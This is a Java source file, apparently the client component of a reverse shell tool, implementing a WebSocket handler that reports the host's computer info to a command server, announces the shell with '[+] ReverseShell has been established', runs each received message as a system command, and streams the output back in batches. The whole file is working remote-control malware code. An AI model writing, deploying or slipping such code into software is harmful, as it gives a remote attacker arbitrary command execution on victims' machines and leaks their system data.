package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.model.InitialConnectionMessageModel;
import com.mtattab.reverseshell.model.ManagerCommunicationModel;
import com.mtattab.reverseshell.model.ReverseShellInfoInitialMessage;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.OSUtil;
import com.mtattab.reverseshell.util.ReverseShellSession;
import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.java.Log;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.api.WebSocketAdapter;


import java.io.IOException;
import java.util.ArrayList;

@Getter
@Setter
@Log
public class WebSocketImpl extends WebSocketAdapter {

    private Session session;


    @Override
    public void onWebSocketText(String message) {
        log.info( message);
        ManagerCommunicationModel command = DataManipulationUtil.jsonToObject(message, ManagerCommunicationModel.class);
        executeCommandFromServer(command);

        InitialConnectionMessageModel initialConnectionMessageModel = DataManipulationUtil.jsonToObject(message, InitialConnectionMessageModel.class);
        ReverseShellSession.setSessionId(initialConnectionMessageModel);
//        System.out.println(ReverseShellSession.getSessionId());
        



    }
    private void executeCommandFromServer(ManagerCommunicationModel command){
        if (command != null){
            String commandResponse = SystemCommandProxyUtil.runCommand(command.getMsg());
//            System.out.println(commandResponse.length());

            try {

                sendMessageInPatches(commandResponse,8000, command.getUuid());


            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    private void sendMessageInPatches(String commandResponse , int length, String uuid ) throws IOException {
        ArrayList<String> wordsBatch = DataManipulationUtil.splitString(commandResponse,length);

        for (String batch : wordsBatch) {

            session.getRemote()
                    .sendString(
                            DataManipulationUtil.convertObjToJson(
                                    CommandRestOutput.builder()
                                    .output(batch)
                                    .uuid(uuid)
                                    .build()
                            )
                    );
        }
    }
    @Override
    public void onWebSocketConnect(Session session){
        this.session= session;
        sendInitialMessage();
    }

    private void sendInitialMessage(){
        try {
//            send initial message with computer info the command server
            ReverseShellInfoInitialMessage initialCommunicationMessage=  OSUtil.getComputerInfo();
            initialCommunicationMessage.setReply("[+] ReverseShell has been established");

            session.getRemote()
                    .sendString(
                            DataManipulationUtil.convertObjToJson(initialCommunicationMessage)
                    );
        } catch (IOException e) {
            e.printStackTrace();
        }
    }







}
